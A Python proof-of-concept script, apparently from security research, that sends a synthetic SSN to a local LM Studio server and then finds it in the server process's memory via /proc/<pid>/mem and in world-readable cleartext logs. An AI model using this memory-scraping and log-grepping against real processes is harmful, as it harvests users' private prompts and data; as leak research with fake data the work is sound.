#!/usr/bin/env python3
# d7_pii_attack_chain.py -- end-to-end PII attack-chain demo.
#
# Combines two ALREADY-PROVEN, separately-documented leak channels into one
# runnable demonstration:
#   1. disk:   ~/.lmstudio/server-logs/ cleartext log (logSensitiveData=true,
#              30-day retention, world-readable) -- PROVIDER_LEAK_MISSION_REPORT.md
#   2. memory: /proc/<pid>/mem heap-string residue (Sites A-D fixed, second
#              leak still open) -- PROMPT_ZEROIZE_PATCH_REPORT.md, D4 report
#
# Uses a SYNTHETIC PII string (clearly fake, labeled as test data) standing in
# for a real PII payload -- demonstrates the mechanism, not a real breach.
#
# Usage: d7_pii_attack_chain.py
import json
import os
import re
import subprocess
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path

ROOT = Path("/home/elaref/research")
LOGS = ROOT / "logs"
LMS_HOME = Path("/home/elaref/.lmstudio")
LMS_LOG_DIR = LMS_HOME / "server-logs"
LMS_BIN = LMS_HOME / "bin" / "lms"
PORT = 1234
# env override for the n>=50 / 4-model statistical-power audit; default
# preserves the original nemotron-only behavior exactly.
MODEL = os.environ.get("D7_MODEL", "nvidia/nemotron-3-nano-4b")

# accept an explicit run_id (sys.argv[1]) so a tight loop (e.g. 50 reps)
# doesn't collide on the same-second timestamp default.
RUN_ID = sys.argv[1] if len(sys.argv) > 1 else datetime.now().strftime("%Y%m%d_%H%M%S")
OUT_JSON = LOGS / f"d7_pii_chain_{RUN_ID}.json"
OUT_LOG = LOGS / f"d7_pii_chain_{RUN_ID}.log"


def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, file=sys.stderr)
    with OUT_LOG.open("a") as f:
        f.write(line + "\n")


def lms(args, timeout=60):
    return subprocess.run([str(LMS_BIN), *args], capture_output=True, text=True, timeout=timeout)


def find_pid():
    r = subprocess.run(["pgrep", "-x", "llmster"], capture_output=True, text=True)
    pids = [int(p) for p in r.stdout.strip().split() if p.strip()]
    return pids[0] if pids else None


def walk_writable_maps(pid):
    rw = []
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                rng, perms = parts[0], parts[1]
                path = parts[5] if len(parts) >= 6 else ""
                if "w" not in perms:
                    continue
                lo, hi = (int(x, 16) for x in rng.split("-"))
                rw.append({"range": rng, "size": hi - lo, "path": path or "[anon]"})
    except Exception:
        pass
    return rw


def scan_for_string(pid, needle, context_bytes=80):
    nb = needle.encode()
    hits = []
    for region in walk_writable_maps(pid):
        rng, size, path = region["range"], region["size"], region["path"]
        if path.endswith(".gguf") or size <= 0 or size > (200 << 20):
            continue
        lo, hi = (int(x, 16) for x in rng.split("-"))
        try:
            with open(f"/proc/{pid}/mem", "rb", 0) as mem:
                mem.seek(lo)
                buf = mem.read(size)
        except (OSError, OverflowError):
            continue
        i = 0
        while True:
            j = buf.find(nb, i)
            if j < 0:
                break
            cs, ce = max(0, j - context_bytes), min(len(buf), j + len(nb) + context_bytes)
            ctx = ''.join(chr(b) if 32 <= b < 127 else '.' for b in buf[cs:ce])
            hits.append({"range": rng, "path": path, "context": ctx})
            i = j + 1
    return hits


def grep_disk_logs(needle):
    hits = []
    for f in LMS_LOG_DIR.rglob("*.log"):
        try:
            text = f.read_text(errors="ignore")
        except Exception:
            continue
        if needle in text:
            line = next((l for l in text.splitlines() if needle in l), "")
            st = f.stat()
            hits.append({
                "file": str(f),
                "perm_octal": oct(st.st_mode & 0o777),
                "world_readable": bool(st.st_mode & 0o004),
                "matching_line": line[:400],
            })
    return hits


def chat(content, timeout=120):
    import urllib.request
    payload = {"model": MODEL, "messages": [{"role": "user", "content": content}],
               "max_tokens": 32, "temperature": 0.0}
    data = json.dumps(payload).encode()
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}/v1/chat/completions", data,
                                  {"Content-Type": "application/json"})
    return urllib.request.urlopen(req, timeout=timeout).read()


def main():
    LOGS.mkdir(exist_ok=True)
    pii_id = uuid.uuid4().hex[:10]
    # synthetic PII -- clearly fake, structurally resembles an SSN + a name,
    # tagged so it cannot be mistaken for a real record even out of context.
    synthetic_pii = f"SSN 000-00-{pii_id[:4]} (SYNTHETIC_TEST_PII_{pii_id}, not a real person)"

    log("D7: end-to-end PII attack-chain demo (synthetic PII, not real)")
    log(f"synthetic_pii = {synthetic_pii!r}")

    cfg = json.loads((LMS_HOME / ".internal" / "http-server-config.json").read_text())
    log(f"logSensitiveData config flag = {cfg.get('logSensitiveData')}")

    log("ensuring lms server is up + model loaded ...")
    lms(["server", "start", "--port", str(PORT)], timeout=30)
    time.sleep(2)
    r = lms(["load", MODEL], timeout=180)
    log(f"model load rc={r.returncode}")
    time.sleep(2)

    pid = find_pid()
    log(f"llmster pid = {pid}")
    if pid is None:
        log("ERROR: no llmster process found after load"); return 1

    log("Step 1: send chat request containing the synthetic PII string")
    chat(f"Please file this note for my records: {synthetic_pii}. Just acknowledge briefly.")
    time.sleep(2)

    log("Step 2: scan process memory for the synthetic PII (heap-residue channel)")
    mem_hits = scan_for_string(pid, synthetic_pii)
    log(f"  /proc/{pid}/mem hits: {len(mem_hits)}")

    log("Step 3: grep on-disk server logs for the synthetic PII (disk-log channel)")
    disk_hits = grep_disk_logs(synthetic_pii)
    log(f"  disk log hits: {len(disk_hits)} file(s)")

    result = {
        "run_id": RUN_ID,
        "synthetic_pii": synthetic_pii,
        "log_sensitive_data_enabled": cfg.get("logSensitiveData"),
        "llmster_pid": pid,
        "memory_channel": {"hit_count": len(mem_hits), "sample": mem_hits[:3]},
        "disk_channel": {"hit_count": len(disk_hits), "files": disk_hits},
        "chain_confirmed": bool(mem_hits) and bool(disk_hits),
    }
    OUT_JSON.write_text(json.dumps(result, indent=2))
    log(f"=== WROTE {OUT_JSON} ===")
    log(f"=== chain_confirmed (both channels hit) = {result['chain_confirmed']} ===")
    return 0


if __name__ == "__main__":
    sys.exit(main())
